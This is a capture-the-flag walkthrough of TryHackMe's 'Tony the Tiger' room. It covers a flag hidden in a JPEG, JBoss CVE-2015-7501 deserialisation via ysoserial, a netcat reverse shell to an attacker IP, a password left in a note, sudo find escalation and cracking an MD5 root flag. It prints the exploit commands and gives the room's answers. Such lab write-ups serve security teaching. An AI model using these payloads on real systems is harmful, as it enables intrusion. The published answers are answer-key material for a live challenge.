---
title: "Tony the Tiger"
description: "A cereal blog hides its flag inside a JPEG, JBoss 6 hands out code execution through an unauthenticated deserialisation servlet, a password left in a note moves you sideways, and a passwordless sudo rule for find finishes the box. The root flag is base64 around an unsalted MD5."
difficulty: "Easy"
tags: ["Java Deserialization", "CVE-2015-7501", "JBoss", "ysoserial", "Steganography", "Sudo", "GTFOBins", "Hash Cracking", "Privilege Escalation", "Linux"]
date: "2026-07-01"
---

## Overview

Tony the Tiger is a guided room built around one idea: Java serialisation is a code-execution surface. Everything before the exploit is there to make you look at the JBoss stack on ports 8080 and 8083, and everything after it is ordinary Linux privilege escalation dressed up as a story about a cereal blog.

The path has two halves. The first half is a web puzzle: Tony's blog is a static Hugo site, and one post's photo carries the first flag in its bytes rather than its pixels. The second half is CVE-2015-7501: JBoss 6 exposes `/invoker/JMXInvokerServlet`, which deserialises whatever object you POST to it. A CommonsCollections gadget from ysoserial turns that into a reverse shell as the JBoss service account, `cmnatic`. From there the box is generous — a note contains `jboss`'s password, `jboss`'s `.bash_history` contains the second flag, and `jboss` can run `/usr/bin/find` as root without a password via sudo.

The final flag is not a `THM{}` string. `/root/root.txt` holds base64, the base64 decodes to an MD5 hash, and the hash cracks to a plaintext answer.

![Diagram of the full attack path: blog image, JBoss deserialisation, leftover files, lateral movement, sudo find, and the root flag](/assets/screenshots/tonythetiger/attack-path.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Tony the Tiger |
| Difficulty | Easy |
| Category | boot2root |
| Creator | CMNatic |
| Target | `10.48.153.130` (instance-specific) |
| Open ports (my scan) | 22, 80, 1090, 1091, 1098, 1099, 4446, 5500, 8009, 8080, 8083 |
| Skills | Content discovery, metadata/steganography, Java deserialisation, reverse shells, Linux enumeration, sudo abuse, hash cracking |
| Final answer | `zxcvbnm123456789` (no `THM{}` wrapper) |

The room is an older JBoss 6 image on Ubuntu 14.04. The nmap in the room folder was taken on 26 June 2026 and the root flag was captured on 1 July 2026, so the `date` above reflects the working session rather than the room's release.

One note on scope: this is a guided room, and the task text explains serialisation before asking you to exploit it. The walkthrough below explains the same ideas from the attack side, including the part the task leaves out — why the payload command cannot be an ordinary bash pipeline.

## Enumeration

### The Port Sweep

Service detection is enough to identify the stack:

```bash
nmap -sV -sC -oN nmap.txt 10.48.153.130
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
1090/tcp open  java-rmi    Java RMI
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8083/tcp open  http        JBoss service httpd
```

That is eleven open ports out of the top thousand. The cluster of Java ports is the shape of an application server: JNDI naming on 1090/1091/1098, an RMI registry on 1099, remoting on 4446 and 5500, AJP on 8009, and the HTTP connectors on 8080 and 8083.

Two details are worth pointing at because they drive the rest of the room:

- The 1099 fingerprint contains `org.jnp.server.NamingServer_Stub` and `thm-java-deserial.home`, which names both the product family and the host.
- Port 8080 reports Apache Tomcat/Coyote because JBoss embeds Tomcat as its servlet container. The page title is `Welcome to JBoss AS`.

Other published scans of this room show additional ports such as 3873, 4712, 4713, 5445, 5455, and 5501. Those are part of the same JBoss 6 stack — JNDI, RMI, and HornetQ messaging — and they appear once the server has fully finished booting. The room's own warning about a five-minute boot is real: scanning too early gives a smaller, misleading picture. The room's questions only need 8080.

Port 22 runs OpenSSH 6.6.1p1 and port 80 runs Apache 2.4.7, both of which shipped with Ubuntu 14.04. Neither has an easy public exploit that would be in scope here; they are there so the box feels like a real server.

### The Blog on Port 80

Port 80 is a static site titled "Tony's Blog". The nmap generator line says `Hugo 0.66.0`, so there is no database and no login to attack — the content is a set of pre-built HTML files. Browsing it gives a handful of cereal reviews by a tiger with strong opinions about breakfast.

![Tony's blog post about Frosted Flakes, with the cereal photo that contains the hidden flag](/assets/screenshots/tonythetiger/blog-post.png)

The room's first flag task points at this blog, and the hint is in the prose rather than in a file. The post says that any photo Tony uploads "must have a deeper meaning", which is a nudge to stop reading the words and start looking at the images.

## Tony's Flag: The Photo With a Deeper Meaning

The post lives at `/posts/frosted-flakes/`, and the HTML shows where the image really comes from:

```bash
curl -s http://10.48.153.130/posts/frosted-flakes/ | grep img
```

```html
<link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
<img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />
```

The photo is hosted on imgur rather than on the target, which is a small dead end if you only enumerate the server: the file is not in the web root and gobuster will not find it. It is linked from the page, and that is enough.

Download it and look at what is inside the file rather than what is drawn in it:

```bash
wget https://i.imgur.com/be2sOV9.jpg
strings be2sOV9.jpg | grep "THM"
```

```text
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
```

The flag was appended to the JPEG as extra bytes — the kind of thing that fits in a comment segment or simply after the end-of-image marker. It is invisible when the picture is displayed because image viewers stop at the end of the image data; `strings` does not, because it just walks the file looking for printable ASCII runs.

![The Frosted Flakes photo from Tony's blog; the flag sits in the file's byte stream, not in the pixels](/assets/screenshots/tonythetiger/be2sOV9.jpg)

Two lessons come out of this. First, "steganography" in CTFs is often just appended data; `strings`, `binwalk`, and `exiftool` are faster than any image tool. Second, content that is hosted off-site is still part of the target's attack surface when the target links to it — a static site with no server-side code can still leak a flag through an asset.

The answer to the task is `THM{Tony_Sure_Loves_Frosted_Flakes}`.

## Initial Access: CVE-2015-7501

### What Serialisation Has to Do With It

Serialisation turns an object in memory into a byte stream, and deserialisation turns the byte stream back into an object. Java does this with `ObjectOutputStream` and `ObjectInputStream`; a class opts in by implementing `Serializable`.

The security problem is that the byte stream names the class to instantiate and contains the fields to populate. If an application deserialises bytes that an attacker controls, the attacker gets to choose the class and the field values. Some classes do more in `readObject()` than copy data — they run logic. Chain a few of those together and the logic ends in `Runtime.exec()`.

That is CVE-2015-7501, and JBoss 6 is a textbook case. The `/invoker/JMXInvokerServlet` endpoint accepts a serialised object as the request body and deserialises it before checking anything about the caller. There is no login on that path and no allow-list of classes.

![Diagram: ysoserial builds a CommonsCollections5 object, the exploit POSTs it to JMXInvokerServlet, the servlet calls readObject, and the gadget chain executes a command as cmnatic](/assets/screenshots/tonythetiger/cve-2015-7501-flow.svg)

### Building and Delivering the Payload

Two tools do the work. `ysoserial` builds the malicious object graph, and a small Python script delivers it over HTTP.

The payload type is `CommonsCollections5`. JBoss 6 bundles Apache Commons Collections 3.2.1, whose `InvokerTransformer` can be abused to call arbitrary methods through a chain of `Transformer` objects. `ysoserial` assembles that chain inside an object that looks like a normal map, so the servlet's `readObject()` walks the chain while rebuilding it.

The exploit script in the room folder is the proof of concept by byt3bl33d3r, and it does exactly three things:

```text
gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', command])
r = requests.post('{proto}://{ip}:{port}/invoker/JMXInvokerServlet', ... data=gadget)
if r.status_code == 200: print 'Command executed successfully'
```

The command line is small:

```bash
# listener first
nc -lvnp 4444

# then, from the exploit directory
python2 exploit.py 10.48.153.130:8080 "nc 10.8.19.103 4444 -e /bin/bash" --ysoserial-path ./ysoserial.jar
```

Two practical details:

- The script is Python 2. It uses `print` statements and `check_output`, so run it with `python2` (or port the three lines to Python 3). This is not a bug in the room; it is a 2015 exploit that was never updated.
- `--ysoserial-path` matters if the JAR is not in the current directory. The script looks in `./ysoserial.jar` and `../ysoserial.jar` by default. The room's download includes both the script and the JAR.

If you would rather not run a Python 2 script, `jexboss` is a maintained alternative that checks the same endpoints and can send the reverse shell for you. Published walkthroughs use both; the underlying request is identical.

### Why the Command Is `nc` and Not a Bash Pipeline

This is the part most write-ups skip, and it is the part that explains the payload's odd shape.

`Runtime.exec(String)` does **not** invoke a shell. It splits the string on whitespace into a program and arguments and calls `execve` directly. That means `bash -i >& /dev/tcp/10.8.19.103/4444 0>&1` does not work: the `>`, `&`, and `/dev/tcp` are not interpreted, because there is no shell to interpret them. You are asking the JVM to execute a program literally named `bash` with the arguments `-i`, `>&`, `/dev/tcp/...`, `0>&1`, which is not a valid invocation.

The reliable payload is a single binary that can make the connection itself:

```text
nc 10.8.19.103 4444 -e /bin/bash
```

That works when the target's netcat has the traditional `-e` flag. If it does not, the usual workaround is a brace-expansion trick that fits into one whitespace-free token, for example:

```text
bash -c {echo,<base64-of-reverse-shell>}|{base64,-d}|{bash,-i}
```

The braces and commas are interpreted by bash's expansion rules once bash is running, so the JVM only sees a handful of plain arguments. Either way, the principle is the same: the gadget gives you `execve`, not a shell environment.

![The JBoss admin console login on port 8080, a second way into the same server](/assets/screenshots/tonythetiger/jboss-admin-login.png)

There is a second route worth knowing about. In one published run of this room, `admin:admin` logged straight into the admin console on `/admin-console`. With console access you can deploy a WAR and get code execution that way. The deserialisation path is faster and needs no credentials at all, which is exactly why the CVE was so severe. The console is a reminder that the default-credentials problem and the deserialisation problem are independent: fixing one would not have saved this box.

The exploit lands a shell as `cmnatic`, the account the JBoss process runs under:

```text
cmnatic@thm-java-deserial:/$ whoami
cmnatic
```

It is not root. A service account is still a user on the box, with a home directory and whatever the administrator left lying around.

## The JBoss Account and Its Leftovers

The room asks for "User JBoss' flag", which is a hint to look at `/home/jboss`. The directory listing is more interesting than the flag itself:

```text
-rwxrwxrwx 1 jboss   jboss   181 .bash_history
-rw-rw-r-- 1 cmnatic cmnatic  38 .jboss.txt
-rw-r--r-- 1 jboss   jboss   368 note
```

Three separate mistakes in three lines.

The flag is world-readable even though the directory belongs to `jboss`:

```bash
cat /home/jboss/.jboss.txt
```

```text
THM{50c10ad46b5793704601ecdad865eb06}
```

The note is the second mistake. It is a message from the administrator to JBoss explaining that a password was reset, and it contains that password in plain text:

```bash
cat /home/jboss/note
```

```text
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.
However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
Password: likeaboss

Kind Regards,
CMNatic
```

The third mistake is `.bash_history`, which is `rwxrwxrwx` — readable and writable by every user on the system. It contains the command that created the flag:

```bash
cat /home/jboss/.bash_history
```

```text
touch jboss.txt
echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
mv jboss.txt .jboss.txt
...
sudo -l
```

The `sudo -l` in that history is a preview of the next stage. Shell history is one of the most reliable sources of credentials on a Linux box: people type passwords into commands, `export` secrets, and run reconnaissance that tells you exactly where to look. Here it also gives the flag a second time, in the clear.

If you want to skip the manual reading, one command finds both copies:

```bash
grep -R "THM{" /home 2>/dev/null
```

```text
/home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
/home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
```

## Lateral Movement: cmnatic → jboss

The note gives a password; the obvious thing to do with a password is try it on the account it belongs to:

```bash
su - jboss
# Password: likeaboss
```

```text
jboss@thm-java-deserial:~$ id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
```

Because SSH is open, `ssh jboss@10.48.153.130` with the same password would also work and would give a cleaner terminal, but `su` is enough for the next step. The important point is not the command — it is the pattern. A service account's home directory contained a password reset notice, and that password was reused for the login account. One leaked file turned a web-shell-level foothold into a real user.

## Privilege Escalation: Passwordless find

The first thing to check after landing on a new account is what that account is allowed to do:

```bash
sudo -l
```

```text
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

The rule says jboss may run `find` as any user — including root — without a password. That looks harmless until you remember what `find` can do.

`find` has an `-exec` option that runs an arbitrary command for every matching file. The command is executed by `find` itself, so it inherits `find`'s privileges. Run `find` through sudo and you are running your chosen command as root:

```bash
sudo /usr/bin/find . -exec /bin/bash \;
```

```text
root@thm-java-deserial:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The backslash-escaped semicolon ends the `-exec` clause. `find` runs `/bin/bash` once for the current directory, bash starts as root, and you get a root prompt. Adding `-quit` would make `find` stop after the first match, which is the tidier form shown on GTFOBins:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

Why does the shell keep root instead of dropping back? Because sudo already changed both the real and effective UID to 0 before it executed `find`, so the shell is not in the "setuid but not really root" state that makes bash drop privileges. The privilege escalates at the sudo boundary, not inside `find`.

This is the canonical sudo lesson: a sudoers rule is only as narrow as the program it names. `find`, `vim`, `less`, `awk`, `python`, `tar`, and dozens of others can all run commands, so `NOPASSWD` on any of them is equivalent to `NOPASSWD: ALL`. GTFOBins is the reference for which flag each one needs.

## The Root Flag: Base64, Then MD5

Root's home holds one file:

```bash
cat /root/root.txt
```

```text
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

The `==` padding and the alphabet are base64, not a flag format. Decode it:

```bash
cat /root/root.txt | base64 -d
```

```text
BC77AC072EE30E3760806864E234C7CF
```

The output is 32 hexadecimal characters, which is the length of an MD5 digest. That is not the flag either — it is a hash of the flag. The room's task text says the final answer does not use the `THM{}` format, and this is why: the answer is the plaintext behind the hash.

MD5 is fast and unsalted, so a wordlist finishes it quickly:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
```

John works too:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The plaintext is `zxcvbnm123456789`, which is the room's final answer.

![Decoding root.txt from base64 and recovering the MD5 plaintext](/assets/screenshots/tonythetiger/root-flag-decode.png)

I verified the crack locally instead of trusting the walkthrough text: hashing the candidate reproduces the recorded digest exactly.

```bash
printf '%s' 'zxcvbnm123456789' | md5sum
# bc77ac072ee30e3760806864e234c7cf
```

The two-stage encoding is worth understanding because it is a common CTF pattern and a common real-world mistake. Base64 is encoding, not encryption — it hides nothing from anyone who recognises the padding. MD5 is a hash, not encryption either, and an unsalted one can be tested at billions of candidates per second on a GPU. Wrapping a password in base64 and then hashing it with MD5 is security theatre; the only real protection would have been a slow, salted password hash and, more importantly, not putting the secret in a file that root's shell can read.

## Answers

| Task question | Answer |
|---------------|--------|
| What service runs on port 8080? | Apache Tomcat/Coyote JSP engine 1.1 |
| What is the front-end application on 8080? | JBoss |
| Tony's flag | `THM{Tony_Sure_Loves_Frosted_Flakes}` |
| User JBoss' flag | `THM{50c10ad46b5793704601ecdad865eb06}` |
| The final flag (no `THM{}` format) | `zxcvbnm123456789` |

The room's theory questions are answered by its own material: an object is like a lamp, the acronym for the denial-of-service outcome is DoS, and objects are converted to a byte stream.

## Commands Used

| Purpose | Command |
|---------|---------|
| Service scan | `nmap -sV -sC -oN nmap.txt 10.48.153.130` |
| Find the image URL | `curl -s http://TARGET/posts/frosted-flakes/ \| grep img` |
| Download the photo | `wget https://i.imgur.com/be2sOV9.jpg` |
| Extract the hidden flag | `strings be2sOV9.jpg \| grep THM` |
| Listener | `nc -lvnp 4444` |
| Exploit JBoss | `python2 exploit.py TARGET:8080 "nc ATTACKER 4444 -e /bin/bash" --ysoserial-path ./ysoserial.jar` |
| Alternative exploit | `python jexboss.py -host http://TARGET:8080` |
| Search for flags | `grep -R "THM{" /home 2>/dev/null` |
| Read the note | `cat /home/jboss/note` |
| Read shell history | `cat /home/jboss/.bash_history` |
| Switch user | `su - jboss` |
| Enumerate sudo | `sudo -l` |
| Escalate | `sudo /usr/bin/find . -exec /bin/bash \;` |
| Read root flag | `cat /root/root.txt` |
| Decode | `cat /root/root.txt \| base64 -d` |
| Crack | `hashcat -m 0 hash.txt rockyou.txt` |

## Lessons Learned

- **Serialised data is executable data.** A byte stream that names its own class is a program in everything but syntax. Any endpoint that calls `readObject()` on user input needs authentication and a class allow-list, and even then the safest fix is not to accept serialised objects from untrusted sources at all.
- **Gadget availability decides exploitability.** The bug is in JBoss's servlet, but the exploit only works because the classpath contains Commons Collections 3.2.1 with a usable chain. This is why deserialisation vulnerabilities are so library-dependent, and why a vulnerable endpoint can be harmless on one application server and fatal on another.
- **`Runtime.exec` is not a shell.** Metacharacters, redirection, and pipelines do not work. Reading the payload as "a program plus arguments" is the difference between a working exploit and an hour of confusion.
- **Service accounts are users too.** JBoss running as `cmnatic` gave a normal Unix account, and that account could read files in another user's home directory because the permissions were loose.
- **Shell history is a credential store.** `.bash_history` held both the flag and a `sudo -l` breadcrumb. On a real engagement, checking history files is one of the highest-value, lowest-effort steps.
- **A note on disk is a password on disk.** The administrator reset JBoss's password and then wrote it into a world-readable file. Password resets should go through a channel that does not outlive the reset.
- **Sudo rules on interpreters and tools are root.** `NOPASSWD: /usr/bin/find` is not narrower than `NOPASSWD: ALL`; `-exec` turns find into a command runner. GTFOBins should be the first stop after `sudo -l`.
- **Base64 is not encryption, and MD5 is not a password hash.** Encoding is reversible by anyone, and an unsalted MD5 falls to rockyou. Two layers of "hiding" added no protection once the file was readable.
- **Static sites still have attack surface.** The blog had no server-side code, but it linked to an image whose bytes contained a flag. Content discovery includes the assets a page points at, not just the paths on the server.

## References

- [TryHackMe — Tony the Tiger](https://tryhackme.com/room/tonythetiger)
- [NVD — CVE-2015-7501](https://nvd.nist.gov/vuln/detail/CVE-2015-7501)
- [Rapid7 — JBoss JMXInvokerServlet deserialisation](https://www.rapid7.com/db/modules/exploit/multi/http/jboss_invoke_deploy/)
- [frohoff — ysoserial](https://github.com/frohoff/ysoserial)
- [byt3bl33d3r — java-deserialization-exploits (JBoss PoC)](https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py)
- [joaomatosf — JexBoss](https://github.com/joaomatosf/jexboss)
- [PayloadsAllTheThings — JBoss CVE-2015-7501](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py)
- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [Qiita (kk0128) — Tony the Tiger walkthrough](https://qiita.com/kk0128/items/20e80886632f355df090) (screenshots: blog post, JBoss login, root flag decode)
- [Jason Turley — TryHackMe: Tony the Tiger writeup](https://www.jasonturley.xyz/tryhackme-tony-the-tiger-writeup/)
- [Jesus Gavancho — Tony the Tiger writeup](https://jesusgavancho.gitbook.io/writeups/tony-the-tiger)
- [0xKirito — Tony The Tiger](https://0xkirito.github.io/posts/THM-TonyTheTiger/)

*The room folder contained the challenge image (`be2sOV9.jpg`) and the JBoss exploit resources, but no terminal captures. The three terminal screenshots above are from the Qiita walkthrough credited here; the diagrams are original to this post. IP addresses differ from the local run.*
